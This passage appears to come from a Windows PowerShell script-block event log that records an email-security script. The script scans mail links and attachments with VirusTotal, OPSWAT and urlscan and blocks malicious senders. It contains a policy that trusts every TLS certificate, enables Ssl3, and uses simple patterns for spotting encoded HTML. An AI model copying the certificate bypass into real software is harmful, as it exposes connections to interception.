$LOGFILE\r\n\t\t}else{\r\n\t\t\tSubmit-URL-Virustotal\r\n\t\t\tSubmit-URLSCAN\r\n\t\t\tGoogle-Safe-Browsing\r\n\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"  &gt;&gt; $LOGFILE\r\n\t\t\tif ( $global:enable_SecureX ) {\r\n\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t.\\MineMeld_Indicator.ps1 $URL URL -comment \"AutoSpamEmailScan Script Detected and Blocked\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"$($URL) has been added into MineMeld.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t}\r\n\t\t\t\tif ( $global:MODULE_LIST.'secureX.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\t.\\secureX.ps1 $URL &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"secureX and MDATP investigation is done.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t}\r\n\t\t\t\tif ( $global:MODULE_LIST.'ESA_Spam_Block.ps1' -eq \"ON\" ) {\r\n\t\t\t\t\tif ( ![string]::IsNullOrEmpty($global:CdoMessage) ) {\r\n\t\t\t\t\t\t$regex = [regex]\"\\&lt;(.*)\\&gt;\"\r\n\t\t\t\t\t\t$Blocklist_Sender = $($regex.match($($global:CdoMessage.From)).Groups[1].value).ToLower()\r\n\t\t\t\t\t}else{\r\n\t\t\t\t\t\t$regex = \"From:.*?(?&lt;=[\\[\\&lt;]).+?(?=[\\]\\&gt;])\"\r\n\t\t\t\t\t\t$regex_eml = '([\\w-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([\\w-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)'\r\n\t\t\t\t\t\tif ( @([regex]::Matches($EMAIL.Body.Text, $regex).value).length -gt 1 ) { $Blocklist_Sender = [regex]::Matches($([regex]::Matches($EMAIL.Body.Text, $regex).Value[-1]), $regex_eml).value[-1] }else{  $Blocklist_Sender = [regex]::Matches($([regex]::Matches($EMAIL.Body.Text, $regex).Value), $regex_eml).value }\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif ( ![string]::IsNullOrEmpty($Blocklist_Sender) ) {\r\n\t\t\t\t\t\t.\\ESA_Spam_Block.ps1 $Blocklist_Sender ALL &gt;&gt; $LOGFILE\r\n\t\t\t\t\t\tWrite-OutPut \"SPAM Sender $($Blocklist_Sender) has been blacklisted.\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\t}\r\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\t\t\t}\r\n\t\t\t\t$global:enable_SecureX = $false\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tWrite-OutPut \"====================================================================\" &gt;&gt; $LOGFILE\r\n}\r\n\r\nfunction extract_hyperlink_from_Excel {\r\n\t$URLLIST = @()\r\n\t$excel = New-Object -ComObject excel.application\r\n\t$excel.visible = $False\r\n\t$workbook = $excel.Workbooks.Open($ATTFILENAME)\r\n\t$workbook.saveas($DOWNLOADDIRECTORY+'temp',44)\r\n \t#Looping the Workbook sheet to check all the sheets in the Excel\r\n\tfor ($loop_index = 1; $loop_index -le $workbook.Sheets.Count; $loop_index++)\r\n\t{\r\n\t#Assigining the hyperlinks to the Variable from each sheet\r\n\t\t$Sheet = $workbook.Worksheets($loop_index).Hyperlinks\r\n\t#looping the Sheet one by one and store it in collection\r\n\t\t$Sheet | ForEach-Object{ \r\n\t\t\t$Link = $_.Address\r\n\t\t\t$URLLIST = $URLLIST += $Link\r\n\t\t}\r\n\t}\r\n\t#Kill the excel\r\n\t$workbook.close()\r\n\tStop-Process -name excel\r\n\tRemove-Item -Path \"$($DOWNLOADDIRECTORY)temp.*\"\r\n\tRemove-Item -Force -Recurse -Path \"$($DOWNLOADDIRECTORY)temp_files\"\r\n\t$URLARRAY = @()\r\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\r\n\t# URL is not null or empty do check the URL\r\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\r\n\t\tforeach($URL in $URLARRAY){\r\n\t\t\tWrite-OutPut \"URL:     \",$URL &gt;&gt; $LOGFILE\r\n\t\t\tCheckRedirectedURL\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunction MAIN {\r\n\tdate\r\n\tIf(!(test-path $DOWNLOADDIRECTORY)){ New-Item -ItemType directory -Path $DOWNLOADDIRECTORY }\r\n\tIf(!(test-path $REPORTSDIRECTORY)){ New-Item -ItemType directory -Path $REPORTSDIRECTORY }\r\n\tImport-Module $EWSDLLPATH\r\n\t$SERVICE = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService([Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2010_SP2)\r\n\t$SERVICE.Credentials = New-Object Net.NetworkCredential($USERNAME, $PASSWORD, $DOMAIN)\r\n\t$SERVICE.AutodiscoverUrl($EMAILADDRESS)\r\n\t$INBOX = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($SERVICE,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)\r\n\t$FOLDERROOT = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($SERVICE,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::msgFolderRoot)\r\n\t$SUBFOLDERID = ($FOLDERROOT.FindFolders([Microsoft.Exchange.WebServices.Data.FolderView]100) | where { $_.DisplayName -eq $SUBFOLDER }).Id\r\n\t$PROPERTYSET = new-object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)\r\n\t$PROPERTYSET.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text\r\n\t[System.Net.ServicePointManager]::SecurityProtocol = @(\"Tls12\",\"Tls11\",\"Tls\",\"Ssl3\")\r\n#\t[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12\r\n#\tUse .Net Object to ignore self-signed certificate\r\n\tif (\"TrustAllCertsPolicy\" -as [type]) {}\r\n\telse {\r\n\tAdd-Type @\"\r\n\tusing System.Net;\r\n\tusing System.Security.Cryptography.X509Certificates;\r\n\tpublic class TrustAllCertsPolicy : ICertificatePolicy {\r\n\t\tpublic bool CheckValidationResult(\r\n\t\t\tServicePoint srvPoint, X509Certificate certificate,\r\n\t\t\tWebRequest request, int certificateProblem) {\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\"@\r\n\t[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\r\n\t}\r\n\tif ( $INBOX.TotalCount -ne 0 ){\r\n\t\t$ITEMS = $INBOX.FindItems($INBOX.TotalCount)\r\n\t\tforeach ( $EMAIL in $ITEMS.Items ){\r\n\t\t\t# only get unread emails\r\n\t\t\tif( $EMAIL.isread -eq $false ){\r\n\t\t\t\tif( ($EMAIL.Subject -ne \"Thank you for contacting the eHealth Saskatchewan Service Desk\") -or ($EMAIL.Subject -ne \"Service Desk Auto Reply for emailsecurity@ehealthsask.ca\") ){\r\n\t\t\t\t\t# load the property set to get to the body\r\n\t\t\t\t\t$EMAIL.load($PROPERTYSET)\r\n\t\t\t\t\t$RANDOMID = -join ((48..57) + (97..122) | Get-Random -Count 20 | % {[char]$_})\r\n\t\t\t\t\t$LOGFILE = $REPORTSDIRECTORY+\"security-scan-report_\"+$RANDOMID+\".log\"\r\n\t\t\t\t\t$HTMLREPFILE = $REPORTSDIRECTORY+\"security-scan-report_\"+$RANDOMID+\".html\"\r\n\t\t\t\t\t$SCREENSHOTFILE = $REPORTSDIRECTORY+\"screenshot_\"+$RANDOMID+\".jpg\"\r\n\t\t\t\t\t# output the results - first of all the From, Subject and Date Time Received\r\n\t\t\t\t\tWrite-OutPut \"====================================================================\" &gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"From:    $($EMAIL.From)\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"To:    $($EMAIL.ToRecipients)\" &gt;&gt; $LOGFILE\r\n\t\t\t\t\tWrite-OutPut \"\r\n\r\nScriptBlock ID: 5b10436f-ec14-4c18-b4ca-12f2db33c2be\r\nPath: C:\\Users\\vagrant\\posh\\AutoSpamEmailScan.ps1</Message><Level>Warning</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event>",
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "2",
                    "MessageTotal": "3",
                    "ScriptBlockText": "d |  %{ $_.Split('-')[1]; } | foreach{ $_.ToString().Trim() }\n\t$PERMALINK = \"https://virustotal.com/gui/url/\"+$RESULTID+\"/detection\"\n\tStart-Sleep -s 30\n\t$SCANRESULTS = Invoke-RestMethod -Method 'GET' -Uri \"https://www.virustotal.com/api/v3/urls/$RESULTID\" -Headers $HEADERS\n\tWrite-OutPut \"VirusTotal URL Scan Report: \" >> $LOGFILE\n\tWrite-OutPut $PERMALINK >> $LOGFILE\n\tWrite-OutPut \"VirusTotal URL Scan Stats: \" >> $LOGFILE\n\tWrite-OutPut $SCANRESULTS.data.attributes.last_analysis_stats >> $LOGFILE\n\tif ( ($SCANRESULTS.data.attributes.last_analysis_stats.malicious -gt 0) -or ($SCANRESULTS.data.attributes.last_analysis_stats.suspicious -gt 0) ) { $global:enable_SecureX = $true }\n\tWrite-OutPut \"VirusTotal URL COMMUNITY VOTES : \" >> $LOGFILE\n\tWrite-OutPut $SCANRESULTS.data.attributes.total_votes >> $LOGFILE\n\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n}\n\nfunction Submit-FILE-OPSWAT {\n\t$URI = 'https://api.metadefender.com/v4/hash/'+$HASH\n\t$HEADERS = @{}\n\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\n\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $URI  -Headers $HEADERS } catch { $_.Exception.Response.StatusCode.Value__ }\n\tif ( $RESPONSE -eq 404){\n\t\t$FILENAME = Split-Path $FILEPATH -leaf\n\t\t$URI = 'https://api.metadefender.com/v4/file'\n\t\t$HEADERS = @{}\n\t\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\n\t\t$HEADERS.Add('filename', $FILENAME)\n\t\t$SCANRESULT = Invoke-RestMethod -Method 'Post' -Uri $URI  -Headers $HEADERS -Body $FILEPATH -ContentType 'application/octet-stream'\n\t\t$HASH = $SCANRESULT.sha256\n\t\t$DATA_ID = $SCANRESULT.data_id\n\t\t$URI = 'https://api.metadefender.com/v4/file/'+$DATA_ID\n\t\t$HEADERS = @{}\n\t\t$HEADERS.Add('apikey', $OPSWAT_API_KEY)\n\t\tDo {\n\t\t\tStart-Sleep -s 5\n\t\t\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $URI -Headers $HEADERS } catch { $_.Exception.Response.StatusCode.Value__}\n\t\t} Until ($RESPONSE -ne 404) \n\t\tWrite-OutPut \"OPSWAT MetaDefender Cloud File Scan Report: \" >> $LOGFILE\n\t\t$RESULTLINK = 'https://metadefender.opswat.com/results#!/file/'+$HASH+'/hash/overview'\n\t\tWrite-OutPut $RESULTLINK >> $LOGFILE\n\t\tWrite-OutPut \"POSITIVES |   TOTAL\" >> $LOGFILE\n\t\tWrite-OutPut \"$($SCANRESULT.scan_results.total_detected_avs)         |   $($SCANRESULT.scan_results.total_avs)\" >> $LOGFILE\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t}else {\n\t\tWrite-OutPut \"OPSWAT MetaDefender Cloud File Scan Report: \" >> $LOGFILE\n\t\t$RESULTLINK = 'https://metadefender.opswat.com/results#!/file/'+$HASH+'/hash/overview'\n\t\tWrite-OutPut $RESULTLINK >> $LOGFILE\n\t\tWrite-OutPut \"POSITIVES |   TOTAL\" >> $LOGFILE\n\t\tWrite-OutPut \"$($SCANRESULT.scan_results.total_detected_avs)         |   $($SCANRESULT.scan_results.total_avs)\" >> $LOGFILE\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t}\n}\n\nfunction FromEmailAttachment {\n\t$EMLData = Get-Content $Args[0]\n\t$AdoDbStream = New-Object -ComObject ADODB.Stream\n\t$AdoDbStream.Open()\n\t$AdoDbStream.LoadFromFile($Args[0])\n\t$global:CdoMessage = New-Object -ComObject CDO.Message\n\t$global:CdoMessage.DataSource.OpenObject($AdoDbStream,\"_Stream\")\n\tWrite-OutPut \"===From:    $($global:CdoMessage.From)\" >> $LOGFILE\n\tWrite-OutPut \"===To:    $($global:CdoMessage.To)\" >> $LOGFILE\n\tWrite-OutPut \"===Subject:    $($global:CdoMessage.Subject)\" >> $LOGFILE\n\tWrite-OutPut \"===DateTimeReceived:    $($global:CdoMessage.SentOn)\" >> $LOGFILE\n\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t$TextBody = $global:CdoMessage.Fields.Item(\"urn:schemas:httpmail:textdescription\").Value\n\t$HTMLBody = $global:CdoMessage.Fields.Item(\"urn:schemas:httpmail:htmldescription\").Value\n\t$EmailBODY = $TextBody + $HTMLBody + $EMLData\n\t$URLLIST = $EmailBODY | select-string -pattern $URLRegEx -AllMatches  | %{ $_.Matches } | %{ $_.Value } | Sort-Object | ? {$EXEMPTURL -notcontains $_} | Get-Unique\n\t$EXPLIST = $EXEMPTURL | foreach-object { $URLLIST -match $_ }\n\t$URLARRAY = @()\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\n\t\tforeach($URL in $URLARRAY){\n\t\t\tWrite-OutPut \"URL:     \",$URL >> $LOGFILE\n\t\t\tCheckRedirectedURL\n\t\t}\n\t}\n\t$BOUNDARY = $global:CdoMessage.Fields.Item(\"urn:schemas:mailheader:content-type\").Value | %{ $_.Split(';')[1]; } | %{ $_.Split('\"')[1]; }\n\tfor ($i=1;$i -le $global:CdoMessage.Attachments.count;$i++){\n\t\t$ContentMediaType = $global:CdoMessage.Attachments.Item($i).ContentMediaType\n\t\t$FILENAME = $global:CdoMessage.Attachments.Item($i).FileName\n\t\t$AttachmentPATTERN = \"\"\"$FILENAME\"\"(.*?)  --$BOUNDARY\"\n\t\t$ATTACHDATA = [regex]::match($EMLData, $AttachmentPATTERN).Groups[1].Value\n\t\tif ( -not [string]::IsNullOrEmpty($FILENAME) ){\n\t\t\t$TRIMNUM = $ATTACHDATA.LastIndexOf(\"  \")+2\n\t\t\t$ATTACHMENTDATA = $ATTACHDATA.Remove(0,$TRIMNUM)\n\t\t\t$ATTFILENAME = ($DOWNLOADDIRECTORY + $FILENAME.split('.')[0].trim() + \"_\" + $RANDOMID + \".\" + $FILENAME.split('.')[-1].trim())\n\t\t\tTry{ $bytes = [Convert]::FromBase64String($ATTACHMENTDATA) } catch { $Exception = $_.Exception }\n\t\t\tif ( -not ([string]::IsNullOrEmpty($Exception)) ) {\n\t\t\t\tWrite-Output \"Exception Error:\" $Exception.description >> $LOGFILE\n\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE \n\t\t\t}\n\t\t\tif ( -not ([string]::IsNullOrEmpty($bytes)) ) { \n\t\t\t\t[IO.File]::WriteAllBytes($ATTFILENAME, $bytes)\n\t\t\t\tWrite-OutPut \"Downloaded Attachment : Original File $($FILENAME) Saved As $($ATTFILENAME) \" >> $LOGFILE\n\t\t\t\tTry { $ALGORITHM = (Get-FileHash ($ATTFILENAME)).Algorithm }\n\t\t\t\tCatch [System.SystemException] { $ExceptionError = $_.Exception.Message }\n\t\t\t\tif ( [string]::IsNullOrEmpty($ExceptionError) ) {\n\t\t\t\t\t$HASH = (Get-FileHash ($ATTFILENAME)).Hash.ToLower()\n\t\t\t\t\t$FILEPATH = (Get-FileHash ($ATTFILENAME)).Path\n\t\t\t\t\tWrite-OutPut \"Attachment $ALGORITHM Hash : \"  $HASH >> $LOGFILE\n\t\t\t\t\t$EXTENSION = [System.IO.Path]::GetExtension($ATTFILENAME)\n\t\t\t\t\tif ( ($EXTENSION -eq \".pdf\") -or ($EXTENSION -eq \".htm\") -or ($EXTENSION -eq \".html\") -or ($EXTENSION -eq \".shtml\") ){\n\t\t\t\t\t\tif ( $global:MODULE_LIST.'Submit_FILE_Virustotal.py' -eq \"ON\" ) {\n\t\t\t\t\t\t\tWrite-OutPut \"=====================Submit File to VirusTotal and OPSWAT=====================\" >> $LOGFILE\n\t\t\t\t\t\t\tpython Submit_FILE_Virustotal.py $FILEPATH >> $LOGFILE\n\t\t\t\t\t\t\t$scan_result = Get-Content $LOGFILE -Tail 1 | ConvertFrom-Json\n\t\t\t\t\t\t\tif ( ($scan_result.'malicious' -ne 0) -or ($scan_result.'suspicious' -ne 0) ) {\n\t\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\n\t\t\t\t\t\t\t\t\t.\\MineMeld_Indicator.ps1 $HASH $ALGORITHM.ToLower() -comment \"AutoSpamEmailScan Script Detected and Blocked\" >> $LOGFILE\n\t\t\t\t\t\t\t\t\tWrite-OutPut \"$($HASH) has been added into MineMeld.\" >> $LOGFILE\n\t\t\t\t\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tSubmit-FILE-OPSWAT\n\t\t\t\t\t\tWrite-OutPut \"=====================Extract URLs from the PDF/HTML file=====================\" >> $LOGFILE\n\t\t\t\t\t\tExtractURLFromPDFHTML\n\t\t\t\t\t\tif ( $global:MODULE_LIST.'selenium_simulator.py' -eq \"ON\" ) {\n\t\t\t\t\t\t\tWrite-OutPut \"=====================Selenimu Simulator=====================\" >> $LOGFILE\n\t\t\t\t\t\t\tpython selenium_simulator.py $ATTFILENAME $LOGFILE >> $LOGFILE\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( ($EXTENSION -eq \".htm\") -or ($EXTENSION -eq \".html\") -or ($EXTENSION -eq \".shtml\") ){\n\t\t\t\t\t\t\t$HTMLCONTENT = Get-Content($FILEPATH)\n\t\t\t\t\t\t\tif ( ($HTMLCONTENT -like \"*atob('*')*\")  -or ($HTMLCONTENT -like \"*document.write(unescape('*')*\") -or ($HTMLCONTENT -like \"*base64*\") -or ($HTMLCONTENT -like \"*\\u00*\") ){\n\t\t\t\t\t\t\t\tWrite-OutPut \"********************************************************************\" >> $LOGFILE\n\t\t\t\t\t\t\t\tWrite-OutPut \"*                                                                  *\" >> $LOGFILE\n\t\t\t\t\t\t\t\tWrite-OutPut \"*         HTML FILE IS ENCODED AND IT IS HIGHLY SUSPICIOUS         *\" >> $LOGFILE\n\t\t\t\t\t\t\t\tWrite-OutPut \"*                                                                  *\" >> $LOGFILE\n\t\t\t\t\t\t\t\tWrite-OutPut \"********************************************************************\" >> $LOGFILE\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}else {\n\t\t\t\t\t\tif ( -not ([string]::IsNullOrEmpty($FILEPATH)) ){\n\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'Submit_FILE_Virustotal.py' -eq \"ON\" ) {\n\t\t\t\t\t\t\t\tWrite-OutPut \"=====================Submit File to VirusTotal and OPSWAT=====================\" >> $LOGFILE\n\t\t\t\t\t\t\t\tpython Submit_FILE_Virustotal.py $FILEPATH >> $LOGFILE\n\t\t\t\t\t\t\t\t$scan_result = Get-Content $LOGFILE -Tail 1 | ConvertFrom-Json\n\t\t\t\t\t\t\t\tif ( ($scan_result.'malicious' -ne 0) -or ($scan_result.'suspicious' -ne 0) ) {\n\t\t\t\t\t\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\n\t\t\t\t\t\t\t\t\t\t.\\MineMeld_Indicator.ps1 $HASH $ALGORITHM.ToLower() -comment \"AutoSpamEmailScan Script Detected and Blocked\" >> $LOGFILE\n\t\t\t\t\t\t\t\t\t\tWrite-OutPut \"$($HASH) has been added into MineMeld.\" >> $LOGFILE\n\t\t\t\t\t\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tSubmit-FILE-OPSWAT\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}else {\n\t\t\t\t\tWrite-OutPut \"********************************************************************\" >> $LOGFILE\n\t\t\t\t\tWrite-Output \"Exception Error:\" $ExceptionError >> $LOGFILE   \n\t\t\t\t\tWrite-OutPut \"********************************************************************\" >> $LOGFILE\n\t\t\t\t\t}\n\t\t\t}\t\t\n\t\t}\n\t}\n}\n\nfunction ConvertLogToHTML {\n\t$File = Get-Content $LOGFILE\n\t$FileLine = @()\n\tForeach ($Line in $File) {\n\t\t$MyObject = New-Object -TypeName PSObject\n\t\tif ( ($Line -match \"virustotal.com\") -or ($Line -match \"urlscan.io\") -or ($Line -match \"opswat.com\") -or ($Line -match \"checkphish.ai\") -or ($Line -match \"googleapis.com\") ){\n\t\t\tif ($Line -match \".png\"){\n\t\t\t\tAdd-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value \"<a href='$Line'>$Line</a><img src='$Line' height='640' width='800'>\"\n\t\t\t}else{ Add-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value \"<a href='$Line'>$Line</a>\" }\n\t\t}else{ Add-Member -InputObject $MyObject -Type NoteProperty -Name \"Security Scan Report\" -Value $Line }\n\t\t$FileLine += $MyObject\n\t}\n\t$($FileLine | ConvertTo-Html -Title \"Security Scan Report\" -Property \"Security Scan Report\" ) -replace '&gt;','>' -replace '&lt;','<' -replace '&#39;',\"'\" | Out-File $HTMLREPFILE\n}\n\nfunction ExtractURLFromPDFHTML {\n\tif ( $EXTENSION -eq \".pdf\" ){\n\t\tif ( $global:MODULE_LIST.'pdf2url.py' -eq \"ON\" ) {\n\t\t\t$URLArrayFromPDF = & python pdf2url.py $ATTFILENAME\n\t\t}\n\t}else{\n\t\t$HTMLFILE = $ATTFILENAME\n\t\t$URLArrayFromHTML = Get-Content $HTMLFILE | select-string -pattern $URLRegEx -AllMatches | %{ $_.Matches } | %{ $_.Value } | Sort-Object | Get-Unique\n\t}\n\tif ( ![string]::IsNullOrEmpty($URLArrayFromPDF) -and ![string]::IsNullOrEmpty($URLArrayFromHTML) ) {\n\t\t$URLLIST = $URLArrayFromHTML + $URLArrayFromPDF | Sort-Object | Get-Unique\n\t}elseif( [string]::IsNullOrEmpty($URLArrayFromPDF) -and ![string]::IsNullOrEmpty($URLArrayFromHTML) ) {\n\t\t$URLLIST = $URLArrayFromHTML | Sort-Object | Get-Unique\n\t}elseif( ![string]::IsNullOrEmpty($URLArrayFromPDF) -and [string]::IsNullOrEmpty($URLArrayFromHTML) ) {\n\t\t$URLLIST = $URLArrayFromPDF | Sort-Object | Get-Unique\n\t}\n\t$EXPLIST = $EXEMPTURL | foreach-object { $URLLIST -match $_ }\n\t$URLARRAY = @()\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\n\t# URL is not null or empty do check the URL\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\n\t\tforeach($URL in $URLARRAY){\n\t\t\tWrite-OutPut \"URL:     \",$URL >> $LOGFILE\n\t\t\tCheckRedirectedURL\n\t\t\t}\n\t}else{ Write-OutPut \"=====================No URL in the PDF/HTML file needs to scan=====================\" >> $LOGFILE }\n}\n\nfunction CheckRedirectedURL {\n\tif ( $URL -like '*safelinks.protection.outlook.com*' ) { $URL = [System.Web.HttpUtility]::ParseQueryString($(New-Object -TypeName System.Uri -ArgumentList $URL).Query)[\"url\"] }\n\tif ($global:MODULE_LIST.'RedirectURL.py' -eq \"ON\") {\n\t\t$URLAccessible = & python RedirectURL.py $URL\n\t}else{\n\t\t$URLAccessible = $URL\n\t}\n\tif ($URLAccessible -match \"is not accessible.\") {\n\t\tWrite-OutPut \"$($URL) is not accessible.\" >> $LOGFILE\n\t}else{\n\t\tWrite-OutPut \"    |\" >> $LOGFILE\n\t\tWrite-Output \"    |--> The Redirected URL is: $($URLAccessible)\" >> $LOGFILE\n\t\tif ( (! $([System.Uri]$URL).AbsolutePath.EndsWith('/'))  -and ($EXTENSIONARRAY.contains($(([System.Uri]$URL).Segments)[-1].split(\".\")[-1])) ) {\n\t\t\tWrite-OutPut \"$($(([System.Uri]$URL).Segments)[-1]) no needs to scan\" >> $LOGFILE\n\t\t}else{\n\t\t\tSubmit-URL-Virustotal\n\t\t\tSubmit-URLSCAN\n\t\t\tGoogle-Safe-Browsing\n\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"  >> $LOGFILE\n\t\t\tif ( $global:enable_SecureX ) {\n\t\t\t\tif ( $global:MODULE_LIST.'MineMeld_Indicator.ps1' -eq \"ON\" ) {\n\t\t\t\t\t.\\MineMeld_Indicator.ps1 $URL URL -comment \"AutoSpamEmailScan Script Detected and Blocked\" >> $LOGFILE\n\t\t\t\t\tWrite-OutPut \"$($URL) has been added into MineMeld.\" >> $LOGFILE\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t\t\t\t}\n\t\t\t\tif ( $global:MODULE_LIST.'secureX.ps1' -eq \"ON\" ) {\n\t\t\t\t\t.\\secureX.ps1 $URL >> $LOGFILE\n\t\t\t\t\tWrite-OutPut \"secureX and MDATP investigation is done.\" >> $LOGFILE\n\t\t\t\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t\t\t\t}\n\t\t\t\tif ( $global:MODULE_LIST.'ESA_Spam_Block.ps1' -eq \"ON\" ) {\n\t\t\t\t\tif ( ![string]::IsNullOrEmpty($global:CdoMessage) ) {\n\t\t\t\t\t\t$regex = [regex]\"\\<(.*)\\>\"\n\t\t\t\t\t\t$Blocklist_Sender = $($regex.match($($global:CdoMessage.From)).Groups[1].value).ToLower()\n\t\t\t\t\t}else{\n\t\t\t\t\t\t$regex = \"From:.*?(?<=[\\[\\<]).+?(?=[\\]\\>])\"\n\t\t\t\t\t\t$regex_eml = '([\\w-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([\\w-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)'\n\t\t\t\t\t\tif ( @([regex]::Matches($EMAIL.Body.Text, $regex).value).length -gt 1 ) { $Blocklist_Sender = [regex]::Matches($([regex]::Matches($EMAIL.Body.Text, $regex).Value[-1]), $regex_eml).value[-1] }else{  $Blocklist_Sender = [regex]::Matches($([regex]::Matches($EMAIL.Body.Text, $regex).Value), $regex_eml).value }\n\t\t\t\t\t}\n\t\t\t\t\tif ( ![string]::IsNullOrEmpty($Blocklist_Sender) ) {\n\t\t\t\t\t\t.\\ESA_Spam_Block.ps1 $Blocklist_Sender ALL >> $LOGFILE\n\t\t\t\t\t\tWrite-OutPut \"SPAM Sender $($Blocklist_Sender) has been blacklisted.\" >> $LOGFILE\n\t\t\t\t\t}\n\t\t\t\t\tWrite-OutPut 